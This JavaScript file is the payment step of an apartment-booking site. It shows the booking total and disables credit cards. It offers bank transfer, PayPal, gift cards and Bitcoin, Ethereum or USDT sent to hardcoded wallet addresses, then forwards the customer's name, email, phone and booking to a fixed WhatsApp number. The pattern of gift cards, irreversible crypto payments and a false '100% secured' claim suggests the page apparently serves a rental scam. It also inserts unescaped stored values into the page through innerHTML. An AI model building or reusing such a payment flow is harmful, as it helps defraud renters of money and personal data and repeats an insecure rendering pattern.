let payment = document.getElementById("payment");
let fullname = localStorage.getItem("fullName");
let email = localStorage.getItem("email");
let phone = localStorage.getItem("phone");
let category = localStorage.getItem("apartmentCategory");
let title = localStorage.getItem("apartmentTitle");
let city = localStorage.getItem("apartmentCity");
let street = localStorage.getItem("apartmentStreet");
let country = localStorage.getItem("apartmentCountry");
let rating = localStorage.getItem("apartmentRating");
let rated = localStorage.getItem("apartmentRated");
let checkIn = localStorage.getItem("altSelectedDate");
let checkOut = localStorage.getItem("altCheckOutDate");
let totalPrice = localStorage.getItem("totalPrice");
let payMethod, qrcode, network, walletAddress;

payment.innerHTML = `
        <h6 class="fs-sm m-0 mb-2 p-0 lh-sm ellipsis">${title}</h6>
        <h6 class="text-xs acat-color m-0 mb-2 p-0 lh-sm ellipsis">${category}</h6>
        <p class="addrs text-sm m-0 mb-2 p-0 lh-sm ellipsis"><i class="fa fa-map-marker-alt text-primary me-1"></i>${street}, ${city}, ${country}</p>
        <div class="d-flex align-items-center justify-content-start">
            <h5 class="d-inline p-0 m-0 lh-sm me-1">Total</h5>
            <h3 class="d-inline p-0 m-0 lh-sm ms-1 text-primary">${totalPrice}</h3>
        </div>
        <div class="text-primary text-sm mt-2 mb-5 fw-bold">Your transaction is 100% secured🔒</div>
        
        <div class="payment-container">
          <h6>Select Payment Method</h6>
          <div class="payment-method">
            <input type="radio" id="credit" name="payment" disabled>
            <label for="credit">💳 Credit Card &nbsp; <b class="text-danger text-xs">(unavailable)</b></label>
          </div>
          <div class="payment-method">
            <input type="radio" id="bank" name="payment">
            <label for="bank">🏦 Bank Transfer</label>
          </div>
          <div class="payment-method">
            <input type="radio" id="paypal" name="payment">
            <label for="paypal"><i class="fab fa-cc-paypal text-paypal"></i> PayPal</label>
          </div>
          <div class="payment-method">
            <input type="radio" id="gift" name="payment">
            <label for="gift">🎁 Gift Card</label>
          </div>
          <div class="payment-method">
            <input type="radio" id="btc" name="payment">
            <label for="btc"><i class="fab fa-bitcoin text-bitcoin"></i> Bitcoin (BTC)</label>
          </div>
          <div class="payment-method">
             <input type="radio" id="eth" name="payment">
             <label for="eth"><img src="https://cryptologos.cc/logos/ethereum-eth-logo.svg" alt="Ethereum" width="12"> Ethereum (ETH)</label>
          </div>
          <div class="payment-method">
             <input type="radio" id="usdt" name="payment">
             <label for="usdt"><img src="https://cryptologos.cc/logos/tether-usdt-logo.svg" alt="USDT" width="16"> USDT (Tether)</label>
          </div>
        
          <!-- Continue button -->
          <button id="continueBtn"></button>
        </div>
    `;

function showContinueButton() {
    document.getElementById('continueBtn').style.display = 'block';
}

function hideContinueButton() {
    document.getElementById('continueBtn').style.display = 'none';
}

function bank() {
    if (localStorage.getItem('payMethod')) {
        localStorage.removeItem('payMethod');
    }
    localStorage.setItem('payMethod', 'Bank Transfer');
    payMethod = localStorage.getItem('payMethod');
    document.getElementById('continueBtn').textContent = "Pay with Bank Transfer"
    showContinueButton();
}

function paypal() {
    if (localStorage.getItem('payMethod')) {
        localStorage.removeItem('payMethod');
    }
    localStorage.setItem('payMethod', 'Paypal');
    payMethod = localStorage.getItem('payMethod');
    document.getElementById('continueBtn').textContent = "Pay with PayPal"
    showContinueButton();
}

function gift() {
    if (localStorage.getItem('payMethod')) {
        localStorage.removeItem('payMethod');
    }
    localStorage.setItem('payMethod', 'Gift Card');
    payMethod = localStorage.getItem('payMethod');
    document.getElementById('continueBtn').textContent = "Pay with Gift Card"
    showContinueButton();
}

function btc() {
    if (localStorage.getItem('payMethod')) {
        localStorage.removeItem('payMethod');
    }
    if (localStorage.getItem('qrcode')) {
        localStorage.removeItem('qrcode');
    }
    if (localStorage.getItem('network')) {
        localStorage.removeItem('network');
    }
    if (localStorage.getItem('walletAddress')) {
        localStorage.removeItem('walletAddress');
    }
    localStorage.setItem('payMethod', 'Bitcoin (BTC)');
    localStorage.setItem('qrcode', '../img/btcqrcode.jpg');
    localStorage.setItem('network', 'Bitcoin');
    localStorage.setItem('walletAddress', 'bc1qhfdumg06my05xs8303hd8ldrec68hfjs6w8j96');
    payMethod = localStorage.getItem('payMethod');
    qrcode = localStorage.getItem('qrcode');
    network = localStorage.getItem('network');
    walletAddress = localStorage.getItem('walletAddress');
    document.getElementById('continueBtn').textContent = "Pay with Bitcoin (BTC)"
    payTo();
    showPayModal();
    payCountdown();
    hideContinueButton();
}

function eth() {
    if (localStorage.getItem('payMethod')) {
        localStorage.removeItem('payMethod');
    }
    if (localStorage.getItem('qrcode')) {
        localStorage.removeItem('qrcode');
    }
    if (localStorage.getItem('network')) {
        localStorage.removeItem('network');
    }
    if (localStorage.getItem('walletAddress')) {
        localStorage.removeItem('walletAddress');
    }
    localStorage.setItem('payMethod', 'Ethereum (ETH)');
    localStorage.setItem('qrcode', '../img/ethqrcode.jpg');
    localStorage.setItem('network', 'Ethereum');
    localStorage.setItem('walletAddress', '0xE995035DCDeaed974707d9109dD66e3d73cF03B1');
    payMethod = localStorage.getItem('payMethod');
    qrcode = localStorage.getItem('qrcode');
    network = localStorage.getItem('network');
    walletAddress = localStorage.getItem('walletAddress');
    document.getElementById('continueBtn').textContent = "Pay with Ethereum (ETH)"
    payTo();
    showPayModal();
    payCountdown();
    hideContinueButton();
}

function usdt() {
    if (localStorage.getItem('payMethod')) {
        localStorage.removeItem('payMethod');
    }
    if (localStorage.getItem('qrcode')) {
        localStorage.removeItem('qrcode');
    }
    if (localStorage.getItem('network')) {
        localStorage.removeItem('network');
    }
    if (localStorage.getItem('walletAddress')) {
        localStorage.removeItem('walletAddress');
    }
    localStorage.setItem('payMethod', 'USDT (Tether)');
    localStorage.setItem('qrcode', '../img/usdtqrcode.jpg');
    localStorage.setItem('network', 'Tron (TRC20)');
    localStorage.setItem('walletAddress', 'TL45jFkzMDhxGrmzQ65SRN5Rm5nBLCc84J');
    payMethod = localStorage.getItem('payMethod');
    qrcode = localStorage.getItem('qrcode');
    network = localStorage.getItem('network');
    walletAddress = localStorage.getItem('walletAddress');
    document.getElementById('continueBtn').textContent = "Pay with USDT (Tether)"
    payTo();
    showPayModal();
    payCountdown();
    hideContinueButton();
}

function sendWhatsAppMessage() {
    const phoneNumber = "2348033088179";
    const message = `*Name:* ${fullname}\n*Email:* ${email}\n*Phone:* ${phone}\n\n*${title}*\n*Type:* ${category}\n*Location:* ${street}, ${city}, ${country}\n*Check In:* ${checkIn}\n*Check Out:* ${checkOut}\n*Total:* ${totalPrice}\n*Pay with:* ${payMethod}`;
    const encodedMessage = encodeURIComponent(message);
    const whatsappUrl = `https://wa.me/${phoneNumber}?text=${encodedMessage}`;
    window.open(whatsappUrl, "_blank");
}

function showPayModal() {
    document.getElementById("pay-to").style.display = "flex";
}

function closePayModal() {
    document.getElementById("pay-to").style.display = "none";
}

function payTo() {
    let payToInner = document.getElementById("pay-to-inner");
    payToInner.innerHTML = `
    <i id="close-pay-modal" class="fas fa-times"></i>
    <h6 id="pay-title" class="p-0 m-0 mb-4 lh-sm text-center">${payMethod}</h6>
    <div class="pay-qrcode-wrp">
        <img src=${qrcode} alt="BTC QRcode" id="pay-qrcode"/>
    </div>
    <div class="pay-address-wrp">
        <p class="p-0 m-0 mb-1 lh-sm fs-6 fw-bold">Network</p>
        <p id="network" class="lh-sm fs-6 p-0 m-0">${network}</p>
    </div>
    <div class="pay-address-wrp">
        <p class="p-0 m-0 mb-1 lh-sm fs-6 fw-bold">Wallet Address &nbsp; <b id="copied" class="text-success text-sm border border-success rounded-2 px-1">Copied <i class="fas fa-check-circle"></i></b></p>
        <p id="walletAddress" class="text-break lh-sm fs-6 p-0 m-0">${walletAddress}</p>
    </div>
    <button id="copy-button" class="fw-bold">Copy <i class="fas fa-copy"></i></button>
    
    <button id="i-have-paid" class="fw-bold" disabled>I have paid</button>
`

document.getElementById("copy-button").addEventListener('click', copyToClipboard);
document.getElementById("close-pay-modal").addEventListener('click', closePayModal);
document.getElementById('i-have-paid').addEventListener('click', sendWhatsAppMessage2);
}

function copyToClipboard() {
    const walletAddress = document.getElementById("walletAddress").textContent;
    navigator.clipboard.writeText(walletAddress).then(() => {
        document.getElementById("copied").style.display = "inline";
    }).catch(err => {
        console.error("Failed to copy: ", err);
        alert("Failed to copy wallet address.");
    });
}

function payCountdown() {
    document.getElementById("copied").style.display = "none";
    let countdown = 60;
    const iHavePaid = document.getElementById('i-have-paid');
    const interval = setInterval(() => {
        countdown -= 1;
        iHavePaid.textContent = `I have paid (${countdown})`;
        if (countdown === 0) {
            clearInterval(interval);
            iHavePaid.disabled = false;
            iHavePaid.textContent = `I have paid`;
            iHavePaid.classList.add('enabled');
        }
    }, 1000);
}

function sendWhatsAppMessage2() {
    const phoneNumber = "2348033088179";
    const message = `*Name:* ${fullname}\n*Email:* ${email}\n*Phone:* ${phone}\n\n*${title}*\n*Type:* ${category}\n*Location:* ${street}, ${city}, ${country}\n*Check In:* ${checkIn}\n*Check Out:* ${checkOut}\n*Total:* ${totalPrice}\n*I have paid with:* ${payMethod}`;
    const encodedMessage = encodeURIComponent(message);
    const whatsappUrl = `https://wa.me/${phoneNumber}?text=${encodedMessage}`;
    window.open(whatsappUrl, "_blank");
}

document.getElementById('bank').addEventListener('click', bank);
document.getElementById('paypal').addEventListener('click', paypal);
document.getElementById('gift').addEventListener('click', gift);
document.getElementById('btc').addEventListener('click', btc);
document.getElementById('eth').addEventListener('click', eth);
document.getElementById('usdt').addEventListener('click', usdt);
document.getElementById('continueBtn').addEventListener('click', sendWhatsAppMessage);


